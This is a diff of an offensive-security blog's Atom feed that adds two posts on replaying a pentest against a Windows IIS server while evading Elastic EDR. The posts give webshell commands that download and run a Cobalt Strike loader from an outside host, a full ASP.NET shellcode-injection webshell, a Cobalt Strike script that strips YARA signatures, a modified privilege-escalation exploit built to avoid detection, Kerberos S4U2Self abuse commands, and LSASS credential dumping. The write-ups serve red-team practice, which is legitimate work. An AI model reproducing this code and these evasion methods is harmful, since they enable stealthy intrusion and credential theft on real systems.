@@ -1,4 +1,421 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://sokarepo.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://sokarepo.github.io//" rel="alternate" type="text/html" /><updated>2023-11-23T20:06:03+01:00</updated><id>https://sokarepo.github.io//feed.xml</id><title type="html">sokarepo</title><subtitle>soka offsec notes | Web, Active Directory and Maldev stuff</subtitle><author><name>soka</name></author><entry><title type="html">Create Reflective DLL for Cobalt Strike</title><link href="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html" rel="alternate" type="text/html" title="Create Reflective DLL for Cobalt Strike" /><published>2023-10-11T00:00:00+02:00</published><updated>2023-10-11T00:00:00+02:00</updated><id>https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2023/10/11/create-reflective-dll-for-cobaltstrike.html"><![CDATA[<h2 id="context">Context</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://sokarepo.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://sokarepo.github.io//" rel="alternate" type="text/html" /><updated>2024-01-04T15:46:57+01:00</updated><id>https://sokarepo.github.io//feed.xml</id><title type="html">sokarepo</title><subtitle>soka offsec notes | Web, Active Directory and Maldev stuff</subtitle><author><name>soka</name></author><entry><title type="html">Increase your stealth capabilities - part 1</title><link href="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1.html" rel="alternate" type="text/html" title="Increase your stealth capabilities - part 1" /><published>2024-01-04T00:00:00+01:00</published><updated>2024-01-04T00:00:00+01:00</updated><id>https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part1.html"><![CDATA[<p>In a recent assessment, my teammates and I were tasked to perform a web security review of several applications with the possibility to perform internal pentest if the opportunity came up.</p>
+
+<p>On one of the application, we successfully uploaded a aspx webshell which executes Windows cmd.
+The engagement didn’t require us to be stealthy and the goal of this blog post is to reproduce our what we did with Elastic EDR watching us.</p>
+
+<h2 id="web-rce">Web RCE</h2>
+
+<p>We downloaded our CobaltStrike loader and executed it</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://website.crash.lab/webshell.aspx <span class="nt">--data</span> <span class="s1">'70c1cc863a=powershell wget http://xxxx.com/load.exe -outfile C:\Windows\Temp\load.exe'</span>
+<span class="o">&gt;</span> curl http://website.crash.lab/webshell.aspx <span class="nt">--data</span> <span class="s1">'70c1cc863a=C:\Windows\Temp\load.exe'</span>
+</code></pre></div></div>
+
+<p>And we got our beacon back
+<br /></p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities-part/Pasted image 20230908164217.png" alt="Cobalt Strike beacon" />
+<br /></p>
+
+<p>If we look at the alerts in Elastic EDR, we can see that we were very noisy.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities-part/Pasted image 20230908151601.png" alt="Elastic EDR detections" />
+<br /></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Web Shell Detection: Script Process Child of Common Web Processes</code> because the IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code> spawned <code class="language-plaintext highlighter-rouge">cmd.exe</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Suspicious Microsoft IIS Worker Descendant</code> because the IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code> spawned <code class="language-plaintext highlighter-rouge">cmd.exe</code> that suggest the web server has been compromised</li>
+  <li><code class="language-plaintext highlighter-rouge">Remote File Download via PowerShell</code> because of the <code class="language-plaintext highlighter-rouge">wget</code> Powershell command to download our loader</li>
+  <li><code class="language-plaintext highlighter-rouge">Memory Threat Detection Alert: Windows.Trojan.CobaltStrike</code> because Elastic EDR Yara rules flagged our beacon in memory</li>
+  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Network Module Loaded from Suspicious Unbacked Memory</code> - as our beacon is stored in unbacked memory, Elastic EDR caught an API call that came from this suspicious region</li>
+</ul>
+
+<p><br />
+The next step of our exploitation was to escalate our privileges from Local Service Account to Local Administrator.</p>
+
+<p>We can do it in two different ways:</p>
+<ul>
+  <li>abuse <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege to escalate to SYSTEM (we used this way during the engagement)</li>
+  <li>abuse Kerberos <code class="language-plaintext highlighter-rouge">S4U2Self</code> to generate a Service Ticket for a domain user which has local administrator right</li>
+</ul>
+
+<p><br /></p>
+
+<h2 id="eop---seimpersonateprivilege">EoP - SeImpersonatePrivilege</h2>
+
+<p>We used <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> to exploit the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly /home/user/Tools/Windows/GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\load.exe"
+</code></pre></div></div>
+
+<p>And we got our SYSTEM beacon back.
+<br />
+<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities-part/Pasted image 20231006103045.png" alt="SYSTEM beacon" />
+<br /></p>
+
+<p>The last action raised the following alerts:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: Microsoft Common Language Runtime Loaded from Suspicious Memory</code> - because <code class="language-plaintext highlighter-rouge">CLR.dll</code> has been loaded by the post-exploit temporary process</li>
+  <li><code class="language-plaintext highlighter-rouge">Malicious Behavior Detection Alert: AMSI or WLDP Bypass via Memory Patching</code> - the CobaltStrike AMSI patch has been flagged</li>
+</ul>
+
+<h2 id="lsass-dump">LSASS dump</h2>
+
+<p>After we gained NT SYSTEM privileges, we launched the built-in mimikatz command to dump credentials from LSASS.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities-part/Pasted image 20231009144233.png" alt="logonpasswords" />
+<br /></p>
+
+<p>Which raised:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">LSASS Process Access via Windows API</code></li>
+  <li>Mimikatz detected from memory</li>
+  <li><code class="language-plaintext highlighter-rouge">LSASS Access Attempt from Unbacked Memory</code></li>
+</ul>
+
+<p><br />
+<img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities-part/Pasted image 20231009160453.png" alt="logonpasswords detection" />
+<br /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>As we can saw, there are plenty opportunities to detect our actions during the different phase of the attack path:</p>
+<ul>
+  <li>execution of a webshell</li>
+  <li>execution of an .NET assembly through execute-assembly</li>
+  <li>LSASS dump</li>
+</ul>
+
+<p>In the next part I will go through each steps again but with detection in mind.</p>]]></content><author><name>soka</name></author><category term="redteam" /><summary type="html"><![CDATA[In a recent assessment, my teammates and I were tasked to perform a web security review of several applications with the possibility to perform internal pentest if the opportunity came up.]]></summary></entry><entry><title type="html">Increase your stealth capabilities - part 2</title><link href="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2.html" rel="alternate" type="text/html" title="Increase your stealth capabilities - part 2" /><published>2024-01-04T00:00:00+01:00</published><updated>2024-01-04T00:00:00+01:00</updated><id>https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2</id><content type="html" xml:base="https://sokarepo.github.io//redteam/2024/01/04/increase-your-stealth-capabilities-part2.html"><![CDATA[<h2 id="recap">Recap</h2>
+
+<p>During an engagement my teammates and I compromised a Windows server by uploading a webshell then elevated our privilege to SYSTEM and extracted credentials stored in LSASS.
+<br />
+In Part 1, I replayed the scenario in a lab where an Elastic EDR agent is running and we noticed that a lot of detection raised up.
+<br />
+In this Part 2, I will show how we can increase our stealth capabilities by using open source tool and building our own.</p>
+
+<p><br /></p>
+
+<h2 id="cobalt-strike-modifications">Cobalt Strike modifications</h2>
+
+<p>In order to evade ElasticEDR yara rules, I followed the following Fortra <a href="https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature">blogpost</a>.</p>
+
+<p>Yara rules are pretty easy to evade when you know them… ElasticEDR rules can be found <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">here</a>.</p>
+
+<p>I used <a href="https://github.com/xforcered/BokuLoader">BokuLoader</a> (October+ release) to increase evasion capabilities of the Cobalt Strike beacon.
+This release contains call stack spoofing capabilities that bypass Elastic EDR rules based on call stack analysis. You can learn more about it <a href="https://dtsec.us/2023-09-15-StackSpoofin/">here</a>.</p>
+
+<p>After the User-Defined Reflective Loader included in Cobalt Strike, I made the following changes to the <code class="language-plaintext highlighter-rouge">bokuloader.cna</code> to bypass ElasticEDR yara rules:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub boku_strrep {
+	local('$beacon_dll');
+	$beacon_dll = $1;
+	$beacon_dll = strrep($beacon_dll, "ReflectiveLoader", "__BokuLo4d3r____");
+	$beacon_dll = strrep($beacon_dll, "Microsoft Base Cryptographic Provider v1.0", "13367321236742382543232341241261363163151d");
+	$beacon_dll = strrep($beacon_dll, "(admin)", "(2omin)");
+	$beacon_dll = strrep($beacon_dll, "beacon", "b4con5");
+	$beacon_dll = strrep($beacon_dll, "%s as %s\\%s: %d", "%s -&gt; %s\\%s: %d");
+	$beacon_dll = strrep($beacon_dll, "%02d/%02d/%02d %02d:%02d:%02d", "%02d/%02d/%02d&gt;%02d:%02d:%02d");
+	$beacon_dll = strrep($beacon_dll, "This program cannot be run in DOS mode", "13367321236742383543232341221261363163");
+	println("DEBUG - change DOS stub");
+	$beacon_dll = strrep($beacon_dll, "\x4D\x5A\x41\x52\x55\x48\x89\xE5", "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x90");
+	return $beacon_dll;
+}
+</code></pre></div></div>
+
+<p>At this point, Elastic EDR should not detect the Cobalt Strike Reflective DLL as <code class="language-plaintext highlighter-rouge">Windows.Trojan.CobaltStrike</code>.</p>
+
+<p>However, ElasticEDR will still alert if malicious bahaviour is detected:</p>
+<ul>
+  <li>Access to LSASS process from unbacked memory</li>
+  <li>DLL loading from unbacked memory</li>
+  <li>…</li>
+</ul>
+
+<p>Now we have a stealthier beacon, we can start to compromise the Windows server.
+<br /></p>
+
+<h2 id="webshell">Webshell</h2>
+
+<p>As the goal is to get a proper access to the Windows machine, I will try to get a CobaltStrike beacon without executing OS command.</p>
+
+<p>To do so, I crafted a C# web page which will inject the Cobalt Strike beacon into the current IIS process <code class="language-plaintext highlighter-rouge">w3wp.exe</code></p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;%</span><span class="err">@</span> <span class="n">Page</span> <span class="n">Language</span><span class="p">=</span><span class="s">"c#"</span><span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Diagnostics"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Threading.Tasks"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Runtime.InteropServices"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Collections.Generic"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Linq"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Text"</span> <span class="p">%&gt;</span>
+<span class="p">&lt;%</span><span class="err">@</span> <span class="n">Import</span> <span class="n">Namespace</span><span class="p">=</span><span class="s">"System.Runtime.InteropServices"</span> <span class="p">%&gt;</span>
+
+<span class="p">&lt;</span><span class="n">script</span> <span class="n">runat</span><span class="p">=</span><span class="s">"server"</span><span class="p">&gt;</span>
+
+    <span class="cm">/*
+	    Flags and functions import
+	    ...
+    */</span>
+
+    
+    <span class="k">public</span> <span class="kt">string</span> <span class="nf">ServerSideFunction</span><span class="p">()</span>
+    <span class="p">{</span>
+       
+        <span class="kt">byte</span><span class="p">[]</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">REPLACE_ME</span><span class="p">]</span> <span class="p">{</span> <span class="n">REPLACE_ME</span> <span class="p">};</span>
+
+        <span class="n">IntPtr</span> <span class="n">pHandle</span> <span class="p">=</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)(-</span><span class="m">1</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">pHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"OpenProcess failed "</span> <span class="p">+</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">GetLastWin32Error</span><span class="p">();</span>
+        <span class="n">IntPtr</span> <span class="n">addr</span> <span class="p">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">AllocationType</span><span class="p">.</span><span class="n">Commit</span><span class="p">,</span> <span class="n">AllocationProtect</span><span class="p">.</span><span class="n">PAGE_READONLY</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"VirtualAllocEx failed"</span><span class="p">;</span>
+        
+        <span class="kt">uint</span> <span class="n">lpflOldProtect</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+        <span class="kt">bool</span> <span class="n">res</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+
+        <span class="n">res</span> <span class="p">=</span> <span class="nf">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x00000004</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="p">==</span> <span class="k">false</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"VirtualProtectEx RW failed"</span><span class="p">;</span>
+        <span class="n">IntPtr</span> <span class="n">sc</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">AllocHGlobal</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">sc</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"AllocHGlobal failed"</span><span class="p">;</span>
+        <span class="nf">RtlZeroMemory</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+
+        <span class="n">UInt32</span> <span class="n">getsize</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+        <span class="n">NTSTATUS</span> <span class="n">ntstatus</span> <span class="p">=</span> <span class="nf">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="k">ref</span> <span class="n">getsize</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">getsize</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"NtWriteVirtualMemory failed"</span><span class="p">;</span>
+        
+        <span class="n">res</span> <span class="p">=</span> <span class="nf">VirtualProtectEx</span><span class="p">(</span><span class="n">pHandle</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x00000020</span><span class="p">,</span> <span class="k">out</span> <span class="n">lpflOldProtect</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="p">==</span> <span class="k">false</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s">"VirtualProtectEx RX failed"</span><span class="p">;</span>
+        <span class="n">IntPtr</span> <span class="n">Thread_id</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+        <span class="n">IntPtr</span> <span class="n">tHandle</span> <span class="p">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span>
+            <span class="n">pHandle</span><span class="p">,</span> 
+            <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> 
+            <span class="m">0</span><span class="p">,</span> 
+            <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="m">0xfff</span><span class="p">,</span>
+            <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> 
+            <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">CreationFlags</span><span class="p">.</span><span class="n">CREATE_SUSPENDED</span><span class="p">,</span> 
+            <span class="k">out</span> <span class="n">Thread_id</span><span class="p">);</span>
+
+        <span class="nf">QueueUserAPC</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">tHandle</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
+        <span class="nf">ResumeThread</span><span class="p">(</span><span class="n">tHandle</span><span class="p">);</span>
+        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pHandle</span><span class="p">);</span>
+        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">tHandle</span><span class="p">);</span>
+	<span class="k">return</span> <span class="s">"OK"</span><span class="p">;</span>
+
+    <span class="p">}</span>
+<span class="p">&lt;/</span><span class="n">script</span><span class="p">&gt;</span>
+
+<span class="p">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span> <span class="n">PUBLIC</span> <span class="s">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
+    <span class="s">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="n">html</span> <span class="n">xmlns</span><span class="p">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="n">xml</span><span class="p">:</span><span class="n">lang</span><span class="p">=</span><span class="s">"en"</span> <span class="n">lang</span><span class="p">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="n">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="p">-</span><span class="n">equiv</span><span class="p">=</span><span class="s">"Content-Type"</span> <span class="n">content</span><span class="p">=</span><span class="s">"text/html; charset=windows-1252"</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="n">title</span><span class="p">&gt;</span><span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="n">inline</span><span class="p">&lt;/</span><span class="n">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="n">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="n">body</span><span class="p">&gt;</span>
+<span class="p">&lt;%</span> <span class="p">=</span><span class="nf">ServerSideFunction</span><span class="p">()</span> <span class="p">%&gt;</span>
+<span class="p">&lt;/</span><span class="n">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="n">html</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>Which does:</p>
+
+<ol>
+  <li>Get an handle on the current process</li>
+  <li>Allocate RW memory in the process</li>
+  <li>Write the beacon to this memory region</li>
+  <li>Change the memory permissions to RX</li>
+  <li>Call the beacon through APC</li>
+</ol>
+
+<p>When the page is being called, we got our beacon back.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231126111229.png" alt="Cobalt Strike beacon" /></p>
+
+<p><br />
+And I got zero detection from Elastic EDR for this step.
+<br /></p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>Now we have a beacon as a local service account we may want to escalate our privilege to dump some credentials.</p>
+
+<p>I’m aware of 2 ways to perform the privilege escalation:</p>
+<ul>
+  <li>abuse <code class="language-plaintext highlighter-rouge">SeImpersonateToken</code> privilege with a Potato family exploit</li>
+  <li>abuse <code class="language-plaintext highlighter-rouge">S4U2Self</code> Kerberos to forge a Service Ticket on behalf of a domain user who has local admin right</li>
+</ul>
+
+<p>Both methods can be used:</p>
+<ul>
+  <li>Potato exploits trigger a SYSTEM call and impersonate the local account - this might be detected (<del>I don’t know if some AV/EDR have detection rules for this</del>I recently noticed Elastic EDR has a rule for this). This method works on both no domain joined and joined Windows machine.</li>
+  <li>S4USelf method is very stealthy as it only uses Kerberos but it is not usable in a no domain-joined machine and we might need PSRemoting/WinRM to be enabled as we don’t want to use psexec/smbexec/wmiexec/… which will raise security alerts.</li>
+</ul>
+
+<p><br /></p>
+
+<p>Actually there is an universal privilege escalation path when LDAP signature is not enforce (default configuration) on domain controllers but I will make a dedicated blog post on this one later.
+<br /></p>
+
+<h2 id="privilage-escalation---seimpersonateprivilege">Privilage escalation - SeImpersonatePrivilege</h2>
+
+<p>Few months ago, <a href="https://github.com/Prepouce/CoercedPotato">CoercedPotato</a> was released. CoercedPotato is a C++ program which, like the other Potato exploits, spawn a named pipe (via a RPC interface) to receive a SYSTEM authentication and impersonate it. To coerce the SYSTEM auth, CoercedPotato use MS-EFSR and MS-RPRN functions.</p>
+
+<p>As we don’t want to put and execute anything on the disk, I forked and “converted” CoercedPotato to a Reflective DLL <a href="https://github.com/sokaRepo/CoercedPotatoRDLL">CoercedPotatoRDLL</a>.</p>
+
+<p>When I tested the Reflective DLL, I had the surprise that Elastic EDR recently add a Malicious Bahaviour Detection rule that didn’t exist one or two months before… =)</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20231126114713.png" alt="SeImpersonate detection" /></p>
+
+<p>I though that the detection could be based on:</p>
+<ul>
+  <li>use of known “malicious” functions <code class="language-plaintext highlighter-rouge">CreateProcessAsUser</code>/<code class="language-plaintext highlighter-rouge">CreateProcessWithTokenW</code></li>
+  <li>behavior: a process which runs as a local service spawns a process as SYSTEM</li>
+</ul>
+
+<p>If we look at what <code class="language-plaintext highlighter-rouge">CreateProcessAsUser</code> is doing in IDA:</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240102170711.png" alt="IDA" /></p>
+
+<p>The function just forwards the arguments to <code class="language-plaintext highlighter-rouge">CreateProcessInternalW</code> from <code class="language-plaintext highlighter-rouge">KernelBase.dll</code>.
+We can use it in the CoercedPotatoRDLL code:</p>
+
+<pre><code class="language-C">typedef BOOL(WINAPI* fnCreateProcessInternalW)(
+	HANDLE,
+	LPCWSTR,
+	LPWSTR,
+	LPSECURITY_ATTRIBUTES,
+	LPSECURITY_ATTRIBUTES,
+	BOOL,
+	DWORD,
+	LPVOID,
+	LPCWSTR,
+	LPSTARTUPINFOW,
+	LPPROCESS_INFORMATION
+);
+
+fnCreateProcessInternalW CreateProcessInternalW; 
+
+CreateProcessInternalW = (fnCreateProcessInternalW)GetProcAddress(
+										GetModuleHandle(L"kernelbase.dll"),
+										"CreateProcessInternalW"
+										); 
+
+if (!CreateProcessInternalW(hSystemTokenDup,
+							g_pwszProcessName,
+							g_pwszCommandLine,
+							NULL,
+							NULL,
+							g_bInteractWithConsole,
+							dwCreationFlags,
+							lpEnvironment,
+							pwszCurrentDirectory,
+							&amp;si,
+							&amp;pi)) 
+	wprintf(L"CreateProcessInternalW failed, error = %d\n", GetLastError());
+else
+	wprintf(L"CreateProcessInternalW seems OK");
+</code></pre>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104135549.png" alt="CoercedPotatoRDLL beacon" /></p>
+
+<p>With these modifications, Elastic EDR doesn’t alert about the privilege escalation anymore!</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240102172509.png" alt="new beacon" /></p>
+
+<h2 id="privesc---s4u2self">PrivEsc - S4U2Self</h2>
+
+<p>Another way to do this is to abuse Kerberos itself.
+As a local service account, when we authenticate with NTLM or Kerberos on another machine, the machine account is used <code class="language-plaintext highlighter-rouge">WEB1$</code>.
+Therefore, the <a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">tgtdeleg trick</a> can be used to request a delegation TGT on behalf of the machine account.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908163233.png" alt="tgtdeleg" /></p>
+
+<p>Once we have it, we can abuse Kerberos S4U2Self to ask for Service Ticket that impersonates a domain user with local admin right on the machine.</p>
+
+<p>Unfortunately, I did not succeed to perform this step with Cobalt Strike only so I used a SOCKS proxy and Impacket on my Linux VM.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'ticket...'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> web1.kirbi
+<span class="o">&gt;</span> ticketConverter.py web1.kirbi web1.ccache
+<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5CCACHE</span><span class="o">=</span>web1.ccache
+<span class="o">&gt;</span> git clone https://github.com/ThePorgs/impacket/
+<span class="c"># install it</span>
+<span class="c"># carreful with SPN name, try lower case and upper case for "HTTP"</span>
+<span class="c"># I skipped the SOCKS proxy part here</span>
+<span class="o">&gt;</span> getST.py <span class="nt">-self</span> <span class="nt">-impersonate</span> <span class="s2">"sadmin"</span> <span class="nt">-altservice</span> <span class="s2">"HTTP/web1.crash.lab"</span> <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.100.10.5 <span class="s1">'crash.lab/web1$'</span>
+<span class="c"># use this to debug</span>
+<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5_TRACE</span><span class="o">=</span>/dev/stdout
+<span class="o">&gt;</span> <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sadmin@HTTP_web1.crash.lab@CRASH.LAB.ccache
+<span class="c"># update /etc/krb5.conf if GSS error  </span>
+<span class="o">&gt;</span> evil-winrm.rb <span class="nt">-i</span> web1.crash.lab <span class="nt">-r</span> crash.lab
+</code></pre></div></div>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908163828.png" alt="winrm" /></p>
+
+<p>And popup a beacon as local administrator.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20230908164236.png" alt="beacon admin" /></p>
+
+<p><br /></p>
+
+<h2 id="lsass-credentials-dumping">LSASS credentials dumping</h2>
+
+<p>That’s the tricky part… It’s seems that when <code class="language-plaintext highlighter-rouge">Credentials hardening</code> is enabled, it is not possible to open an handle on LSASS.exe</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104110004.png" alt="elasticEDR config" /></p>
+
+<p>When we try to extract credentials with built-in Mimikatz command, it is not possible to access the process.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104105829.png" alt="LSASS denied" /></p>
+
+<p>If we try to use Nanodump, we have the same access issue.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104105810.png" alt="LSASS denied" /></p>
+
+<p>If we turn off the <code class="language-plaintext highlighter-rouge">Credentials hardening</code>, we can successfully dump LSASS process without any alert from Elastic EDR.</p>
+
+<p><img src="/assets/images/redteam/2024-01-04-increase-your-stealth-capabilities/Pasted image 20240104110221.png" alt="LSASS dump" /></p>
+
+<p><br /></p>
+
+<h2 id="alternatives-to-lsass-dump">Alternatives to LSASS dump</h2>
+
+<p>Alternatively we can enumerate TGT inside LSA and look for any interesting users (<code class="language-plaintext highlighter-rouge">sadmin</code> is a good candidate in my lab).</p>
+
